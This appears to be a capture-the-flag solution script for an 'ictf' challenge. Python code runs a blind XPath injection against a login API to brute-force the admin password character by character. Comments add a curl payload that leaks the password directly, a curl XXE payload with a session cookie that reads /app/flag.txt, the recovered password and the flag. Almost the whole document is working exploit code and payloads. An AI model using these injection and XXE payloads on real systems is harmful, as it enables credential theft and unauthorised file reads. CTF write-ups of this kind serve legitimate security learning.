import requests
import string
from tqdm import tqdm


def try_char(idx, c):
    return (
        "username"
        in requests.post(
            "https://ancient.ictf.iciaran.com/api/login",
            headers={
                "Content-Type": "text/xml",
            },
            data=f"<LOGIN><USER>admin</USER><PASSWORD>' or (NAME/text()='admin' and substring(PASSWORD/text(),{idx},1)='{c}') and ''='</PASSWORD></LOGIN>",
        ).json()
    )


def get_char(idx):
    for c in tqdm(string.printable, desc=f"Trying {idx}"):
        if try_char(idx, c):
            return c


pwd = ""
for i in range(1, 20 + 1):
    c = get_char(i)
    pwd += c
    print(pwd)

# admin password: 9PNmvIlAgmEeZMBiXkLZ
# another way to leak: curl 'https://ancient.ictf.iciaran.com/api/login' -H 'Content-Type: text/xml' --data-raw $'<LOGIN><USER>admin</USER><PASSWORD>\' or NAME/text()=\'admin\']/PASSWORD/text()|/USERS/USER[\'peko\'=\'</PASSWORD></LOGIN>'
# curl 'https://ancient.ictf.iciaran.com/api/admin' -H 'Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.YkL1Dw.VzAsJYIrWT_YRagrObi2kVZGz3g' -H 'Content-Type: text/xml' --data-raw $'<?xml version="1.0" encoding="ISO-8859-1"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY flag SYSTEM "file:///app/flag.txt" >]><LOGIN><USER>&flag;</USER><PASSWORD>9PNmvIlAgmEeZMBiXkLZ</PASSWORD></LOGIN>'
# ictf{1n_4_l4nd_b3f0r3_js0n}
